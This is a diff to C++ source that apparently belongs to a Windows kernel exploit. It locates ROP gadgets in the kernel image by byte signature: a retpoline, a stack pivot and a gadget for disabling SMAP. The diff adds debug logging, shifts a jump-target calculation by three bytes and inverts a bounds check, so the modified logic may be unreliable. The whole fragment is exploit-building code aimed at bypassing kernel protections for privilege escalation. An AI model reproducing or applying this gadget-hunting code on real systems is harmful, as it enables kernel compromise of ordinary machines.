@@ -271,11 +271,15 @@ private:
 		const Byte* smapGadget = nullptr;
 		g_KernelBinary->ForEveryCodeSignatureOccurrence(signature,
 			[&](const Byte* occurrence) -> bool {
+				std::cout << "[*] Consumer called, occurrence=" << std::hex << Qword(occurrence) << std::endl;
+
 				auto* rel32 = occurrence + sizeof(ClacJmpRel32);
-				auto* jmpTarget = occurrence + *(int*)rel32 + 5;
+				auto* jmpTarget = occurrence + *(int*)rel32 + 5 +3;
+
+				std::cout << "[*] jmp target=" << std::hex << Qword(jmpTarget) << std::endl;
 
 				// simple bounds check
-				if (g_KernelBinary->InKernelBounds(jmpTarget)) return true;
+				if (!g_KernelBinary->InKernelBounds(jmpTarget)) return true;
 
 				auto found = Sig::FindSignatureInBuffer(
 					std::span<const Byte>(jmpTarget, jmpTarget + restOfGadget.size()),
@@ -297,11 +301,15 @@ private:
 
 	bool InitializeGadgets()
 	{
+		OutputDebugStringA("[*] Finding gadgets...\n");
+
 		const std::string RetpolineCode = "488b442420488b4c2428488b5424304c8b4424384c8b4c24404883c44848ffe0";
 		auto retpolineSignature = Sig::FromHex(RetpolineCode);
 		auto retpolineAddress =  g_KernelBinary->FindSignature(retpolineSignature, KernelBinary::LocationFlags::InCode);
 		if (!retpolineAddress) return false;
 		m_Gadgets.Retpoline = retpolineAddress.value();
+
+		OutputDebugStringA("\t[*] Successfully found retpoline\n");
 
 		const std::string StackPivotCode = "488be54883c4305f5e5dc3";
 		auto stackPivotSignature = Sig::FromHex(StackPivotCode);
@@ -309,9 +317,13 @@ private:
 		if (!stackPivotAddress) return false;
 		m_Gadgets.StackPivot = stackPivotAddress.value();
 	
+		OutputDebugStringA("\t[*] Successfully found stack pivot\n");
+
 		auto smapGadget = TryFindSmapGadget();
 		if (!smapGadget) return false;
 		m_Gadgets.DisableSmap = smapGadget.value();
+
+		OutputDebugStringA("[+] Successfully found all gadgets\n");
 
 		return true;
 	}
